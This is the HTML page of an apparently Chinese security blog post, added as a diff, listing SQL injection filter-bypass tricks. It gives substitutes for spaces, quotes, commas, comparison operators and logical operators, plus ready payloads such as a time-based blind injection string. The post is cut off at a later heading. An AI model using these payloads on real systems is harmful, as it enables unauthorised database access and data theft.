@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SQL注入-Bypass - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, SQL注入' />
+  <meta itemprop="name" content="SQL注入-bypass">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="423">
+  <meta itemprop="keywords" content="OWASP,SQL注入"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/117/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="SQL注入-bypass">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="SQL注入">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SQL注入-bypass">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/117/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/118/" /><link rel="next" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/79/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SQL注入-bypass",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/sql%E6%B3%A8%E5%85%A5\/117\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, SQL注入","wordcount":  423 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/sql%E6%B3%A8%E5%85%A5\/117\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">SQL注入-Bypass</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>SQL注入-Bypass</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="423 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+  <a href="#heading" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h5 id="空格" class="heading-element"><span>0.0.0.2  空格</span>
+  <a href="#%e7%a9%ba%e6%a0%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.注释符 <span style="color:#828b96;font-style:italic">/**/</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">SELECT</span><span style="color:#828b96;font-style:italic">/**/</span><span style="color:#58a1dd">name</span><span style="color:#828b96;font-style:italic">/**/</span><span style="color:#ff636f">FROM</span><span style="color:#828b96;font-style:italic">/**/</span><span style="color:#ff636f">table</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.<span style="color:#58a1dd">url编码</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">%</span><span style="color:#58a1dd">a0</span> 发出去就是空格的意思，但是需要在<span style="color:#58a1dd">burp中抓包后修改</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span>.浮点数
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">users</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">E0union</span> <span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>
+</span></span><span style="display:flex;"><span>等价于
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">users</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8</span>.<span style="color:#a6be9d">0</span> <span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.<span style="color:#58a1dd">TAB</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">5</span>.两个空格代替一个空格
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">6</span>.括号
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">27</span><span style="color:#ff636f">and</span>(<span style="color:#58a1dd">sleep</span>(<span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">mid</span>(<span style="color:#ff636f">database</span>()<span style="color:#ff636f">from</span>(<span style="color:#a6be9d">1</span>)<span style="color:#ff636f">for</span>(<span style="color:#a6be9d">1</span>)))<span style="color:#ff636f">=</span><span style="color:#a6be9d">109</span>))<span style="color:#ff636f">%</span><span style="color:#a6be9d">23</span></span></span></code></pre></div><h5 id="引号" class="heading-element"><span>0.0.0.3  引号</span>
+  <a href="#%e5%bc%95%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">16</span>进制
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">column_name</span>  <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">tables</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">table_name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span><span style="color:#58a1dd">x7573657273</span></span></span></code></pre></div><h5 id="逗号" class="heading-element"><span>0.0.0.4  逗号</span>
+  <a href="#%e9%80%97%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.<span style="color:#ff636f">from</span>  
+</span></span><span style="display:flex;"><span>对于<span style="color:#58a1dd">substr</span>()和<span style="color:#58a1dd">mid</span>()这两个方法可以使用<span style="color:#ff636f">from</span> <span style="color:#58a1dd">to的方式来解决</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">substr</span>(<span style="color:#ff636f">database</span>() <span style="color:#ff636f">from</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">for</span> <span style="color:#a6be9d">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">mid</span>(<span style="color:#ff636f">database</span>() <span style="color:#ff636f">from</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">for</span> <span style="color:#a6be9d">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.<span style="color:#ff636f">join</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">union</span> <span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>     <span style="color:#ff636f">#</span>等价于
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">union</span> <span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> (<span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span>)<span style="color:#58a1dd">a</span> <span style="color:#ff636f">join</span> (<span style="color:#ff636f">select</span> <span style="color:#a6be9d">2</span>)<span style="color:#58a1dd">b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span>.<span style="color:#ff636f">like</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">mid</span>(<span style="color:#ff636f">user</span>(),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>))<span style="color:#ff636f">=</span><span style="color:#a6be9d">80</span>   <span style="color:#ff636f">#</span>等价于
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">user</span>() <span style="color:#ff636f">like</span> <span style="color:#a6be9d">&#39;r%&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.<span style="color:#ff636f">offset</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">news</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>  <span style="color:#ff636f">#</span>等价于
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">news</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">offset</span> <span style="color:#a6be9d">0</span></span></span></code></pre></div><h5 id="注释符" class="heading-element"><span>0.0.0.5  注释符</span>
+  <a href="#%e6%b3%a8%e9%87%8a%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>手动闭合引号，不使用注释符
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39; union select 1,2,3||&#39;</span><span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39; union select 1,2,&#39;</span><span style="color:#a6be9d">3</span></span></span></code></pre></div><h5 id="比较符" class="heading-element"><span>0.0.0.6  比较符&lt;&gt;</span>
+  <a href="#%e6%af%94%e8%be%83%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.<span style="color:#58a1dd">greatest</span>()、<span style="color:#58a1dd">least</span>（）：（前者返回最大值，后者返回最小值）
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">users</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">and</span> <span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#ff636f">database</span>(),<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>))<span style="color:#ff636f">&gt;</span><span style="color:#a6be9d">64</span> <span style="color:#ff636f">#</span>等价于
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">users</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">and</span> <span style="color:#58a1dd">greatest</span>(<span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#ff636f">database</span>(),<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>)),<span style="color:#a6be9d">64</span>)<span style="color:#ff636f">=</span><span style="color:#a6be9d">64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.<span style="color:#ff636f">between</span>  <span style="color:#ff636f">and</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">between</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">and</span> <span style="color:#58a1dd">b</span>：返回<span style="color:#58a1dd">a</span>，<span style="color:#58a1dd">b之间的数据</span>，不包含<span style="color:#58a1dd">b</span>。</span></span></code></pre></div><h5 id="等号" class="heading-element"><span>0.0.0.7  等号=</span>
+  <a href="#%e7%ad%89%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">like</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">rlike</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">regexp</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><h5 id="or-and-xor-not" class="heading-element"><span>0.0.0.8  <code>or</code> <code>and</code> <code>xor</code> <code>not</code></span>
+  <a href="#or-and-xor-not" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>使用符号代替
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">and</span><span style="color:#ff636f">=`&amp;&amp;`</span>  <span style="color:#ff636f">or</span><span style="color:#ff636f">=`||`</span>   <span style="color:#58a1dd">xor</span><span style="color:#ff636f">=`|`</span>   <span style="color:#ff636f">not</span><span style="color:#ff636f">=`!`</span></span></span></code></pre></div><h5 id="过滤unionselectwhere等" class="heading-element"><span>0.0.0.9  过滤<code>union</code>，<code>select</code>，<code>where</code>等</span>
+  <a href="#%e8%bf%87%e6%bb%a4unionselectwhere%e7%ad%89" class="heading-mark">
